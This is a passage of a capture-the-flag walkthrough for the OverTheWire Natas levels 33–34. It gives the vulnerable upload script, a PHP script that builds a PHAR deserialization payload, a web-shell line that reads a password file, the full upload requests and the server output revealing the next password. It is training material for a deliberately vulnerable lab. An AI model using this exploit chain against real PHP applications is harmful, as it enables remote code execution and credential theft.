Thus: `natas33:2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ`.

## Natas 33

### Credentials

Username: natas33

Password: 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ

URL: http://natas33.natas.labs.overthewire.org

### Message

Can you get it right?

Upload Firmware Update: ...

It gives the source code. 

### Solution

The source code:
```html
 <html>
    <head>
        <!-- This stuff in the header has nothing to do with the level -->
        <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
        <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
        <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
        <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
        <script>var wechallinfo = { "level": "natas33", "pass": "<censored>" };</script></head>
    </head>
    <body>
        <?php
            // graz XeR, the first to solve it! thanks for the feedback!
            // ~morla
            class Executor{
                private $filename=""; 
                private $signature='adeafbadbabec0dedabada55ba55d00d';
                private $init=False;

                function __construct(){
                    $this->filename=$_POST["filename"];
                    if(filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
                        echo "File is too big<br>";
                    }
                    else {
                        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {
                            echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
                            echo "Firmware upgrad initialised.<br>";
                        }
                        else{
                            echo "There was an error uploading the file, please try again!<br>";
                        }
                    }
                }

                function __destruct(){
                    // upgrade firmware at the end of this script

                    // "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
                    chdir("/natas33/upload/");
                    if(md5_file($this->filename) == $this->signature){
                        echo "Congratulations! Running firmware update: $this->filename <br>";
                        passthru("php " . $this->filename);
                    }
                    else{
                        echo "Failur! MD5sum mismatch!<br>";
                    }
                }
            }
        ?>

        <h1>natas33</h1>
        <div id="content">
            <h2>Can you get it right?</h2>

            <?php
                session_start();
                if(array_key_exists("filename", $_POST) and array_key_exists("uploadedfile",$_FILES)) {
                    new Executor();
                }
            ?>
            <form enctype="multipart/form-data" action="index.php" method="POST">
                <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
                <input type="hidden" name="filename" value="<?php echo session_id(); ?>" />
                Upload Firmware Update:<br/>
                <input name="uploadedfile" type="file" /><br />
                <input type="submit" value="Upload File" />
            </form>

            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
        </div>
    </body>
</html>
```

Write `natas33.php`:
```php
<?php

class Executor{
    private $filename = "shell.php";
    private $signature = True;
    private $init = false;
}

$phar = new Phar('natas.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');

$object = new Executor();
$object->data = 'rips';
$phar->setMetadata($object);
$phar->stopBuffering();

?>
```
and `shell.php`:
```php
<?php echo shell_exec('cat /etc/natas_webpass/natas34'); ?>
```

Generate `natas.phar` by executing `natas33.php`:
```bash
php -d phar.readonly=false natas33.php
```

Now:
1. Uplaod `shell.php` using Burp to change the random name to `shell.php` and this way make it predictable.

```
POST /index.php HTTP/1.1
Host: natas33.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------26461770181576189004878283164
Content-Length: 545
Origin: http://natas33.natas.labs.overthewire.org
Authorization: Basic bmF0YXMzMzoydjluRGxiU0Y3anZhd2FDbmNyNVo5a1N6a21CZW9DSg==
Connection: keep-alive
Referer: http://natas33.natas.labs.overthewire.org/
Cookie: PHPSESSID=lj6f0ludrbgm09kv86igkptmbv
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

-----------------------------26461770181576189004878283164
Content-Disposition: form-data; name="MAX_FILE_SIZE"

4096
-----------------------------26461770181576189004878283164
Content-Disposition: form-data; name="filename"

shell.php
-----------------------------26461770181576189004878283164
Content-Disposition: form-data; name="uploadedfile"; filename="shell.php"
Content-Type: text/php

<?php echo shell_exec('cat /etc/natas_webpass/natas34'); ?>
-----------------------------26461770181576189004878283164--
```

2. Upload `natas.phar` in the same way.

```
POST /index.php HTTP/1.1
Host: natas33.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------133839341841371114322455338648
Content-Length: 778
Origin: http://natas33.natas.labs.overthewire.org
Authorization: Basic bmF0YXMzMzoydjluRGxiU0Y3anZhd2FDbmNyNVo5a1N6a21CZW9DSg==
Connection: keep-alive
Referer: http://natas33.natas.labs.overthewire.org/index.php
Cookie: PHPSESSID=lj6f0ludrbgm09kv86igkptmbv
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

-----------------------------133839341841371114322455338648
Content-Disposition: form-data; name="MAX_FILE_SIZE"

4096
-----------------------------133839341841371114322455338648
Content-Disposition: form-data; name="filename"

natas.phar
-----------------------------133839341841371114322455338648
Content-Disposition: form-data; name="uploadedfile"; filename="natas.phar"
Content-Type: application/octet-stream

<?php __HALT_COMPILER(); ?>
Â                 O:8:"Executor":4:{s:18:" Executor filename";s:9:"shell.php";s:19:" Executor signature";b:1;s:14:" Executor init";b:0;s:4:"data";s:4:"rips";}   test.txt          Ç§;¤      text7÷ A|i{ Ñg`ù:ùgic¢_|lÞÝ7º   GBMB
-----------------------------133839341841371114322455338648--
```

3. Reuse the same `natas.phar` request with `phar://natas.phar/test.txt` as value.

```
POST /index.php HTTP/1.1
Host: natas33.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------223950164925924002062072751758
Content-Length: 778
Origin: http://natas33.natas.labs.overthewire.org
Authorization: Basic bmF0YXMzMzoydjluRGxiU0Y3anZhd2FDbmNyNVo5a1N6a21CZW9DSg==
Connection: keep-alive
Referer: http://natas33.natas.labs.overthewire.org/
Cookie: PHPSESSID=lj6f0ludrbgm09kv86igkptmbv
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

-----------------------------223950164925924002062072751758
Content-Disposition: form-data; name="MAX_FILE_SIZE"

4096
-----------------------------223950164925924002062072751758
Content-Disposition: form-data; name="filename"

phar://natas.phar/test.txt
-----------------------------223950164925924002062072751758
Content-Disposition: form-data; name="uploadedfile"; filename="natas.phar"
Content-Type: application/octet-stream

<?php __HALT_COMPILER(); ?>
Â                 O:8:"Executor":4:{s:18:" Executor filename";s:9:"shell.php";s:19:" Executor signature";b:1;s:14:" Executor init";b:0;s:4:"data";s:4:"rips";}   test.txt          Ç§;¤      text7÷ A|i{ Ñg`ù:ùgic¢_|lÞÝ7º   GBMB
-----------------------------223950164925924002062072751758--
```

Result:
```
HTTP/1.1 200 OK
Date: Sat, 04 Jan 2025 15:17:22 GMT
Server: Apache/2.4.58 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 2112
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
    <head>
        <!-- This stuff in the header has nothing to do with the level -->
        <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
        <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
        <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
        <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
        <script>var wechallinfo = { "level": "natas33", "pass": "2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ" };</script></head>
    </head>
    <body>
        
        <h1>natas33</h1>
        <div id="content">
            <h2>Can you get it right?</h2>

            <br />
<b>Warning</b>:  move_uploaded_file(/natas33/upload/phar://natas.phar/test.txt): failed to open stream: No such file or directory in <b>/var/www/natas/natas33/index.php</b> on line <b>27</b><br />
<br />
<b>Warning</b>:  move_uploaded_file(): Unable to move '/var/lib/php/uploadtmp/phpd3sLeh' to '/natas33/upload/phar://natas.phar/test.txt' in <b>/var/www/natas/natas33/index.php</b> on line <b>27</b><br />
There was an error uploading the file, please try again!<br>Failur! MD5sum mismatch!<br>            <form enctype="multipart/form-data" action="index.php" method="POST">
                <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
                <input type="hidden" name="filename" value="lj6f0ludrbgm09kv86igkptmbv" />
                Upload Firmware Update:<br/>
                <input name="uploadedfile" type="file" /><br />
                <input type="submit" value="Upload File" />
            </form>

            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
        </div>
    </body>
</html>
Congratulations! Running firmware update: shell.php <br>j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY
```

## Natas 34

Congratulations! You have reached the end... for now.